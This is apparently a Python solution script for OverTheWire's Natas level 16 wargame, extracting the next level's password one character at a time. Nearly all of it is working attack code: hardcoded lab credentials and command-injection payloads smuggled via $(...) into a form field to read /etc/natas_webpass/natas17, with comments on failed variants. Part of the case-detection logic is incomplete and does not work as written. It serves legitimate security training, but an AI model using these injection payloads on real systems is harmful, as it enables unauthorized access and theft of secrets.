from base64 import b64encode

import requests

idx = 1
pw = ''
url = 'http://natas16.natas.labs.overthewire.org/index.php'
userAndPass = b64encode(b"natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh").decode("ascii")
headers = {'Authorization': 'Basic %s' % userAndPass}

letter2Number = {'a': 0, 'b': 1, 'c': 2, 'd': 3, 'e': 4, 'f': 5, 'g': 6, 'h': 7, 'i': 8, 'p': 9}

def getMatch(needle):
    res = requests.post(url, headers=headers, data={'needle': needle})
    return res.text.splitlines()[22]


while idx < 32:
    print("looking for %i" % idx)
    # grep -i "^$(cut -c{idx} /etc/natas_webpass/natas17)" dictionary.txt
    match = getMatch("^$(cut -c%i /etc/natas_webpass/natas17)" % idx)
    if match == '</pre>':
        print(f"resolving number")
        # $n is a number

        # {,3} is not supported in grep -i, only in -E.

        # "^$(char(61+$n))" => a|A => $n == 0, q => $n==9.
        # xxd -p -r <(echo 61) => a. hex wert als input
        #match = getMatch("^$(xxd -p -r <(echo $((61 + $(cut -c%i /etc/natas_webpass/natas17) )) ))" % idx)
        #print(f"mapping first char of %s to number" % match)
        #match = str(letter2Number[match[0].lower()])
        # doesnt work because process substitution is not available in sh

        # process substitution with <( seems not to work in sh (whats most probably used in php passthru ...)
        # match = getMatch("^$(tr -d \\n < <(head -n$(cut -c%i /etc/natas_webpass/natas17) <(yes .)))$" % idx)

        # generates one . too much, 1 is minimum.
        # ergo: a 0 outputs .
        match = getMatch("^$(printf .%.0s $(seq 0 $(cut -c"+str(idx)+" /etc/natas_webpass/natas17)))$")
        print("mapping length of %s to number" % match)
        match = str(len(match)-1)
    else:
        # alpha char matched, but case not known yet
        match = match[0]
        # printf %d \'A => ' is not allowed
        # echo a | od -A n -t d1 => pipe not allowed
        withCase = getMatch("^$(printf .%.0s $(( ord($(cut -c"+str(idx)+" /etc/natas_webpass/natas17)) / 10 )))$") # => len(withCase[0]) in (6,7,8,9) ? upper : lower
    pw += match
    print(pw)
    idx += 1
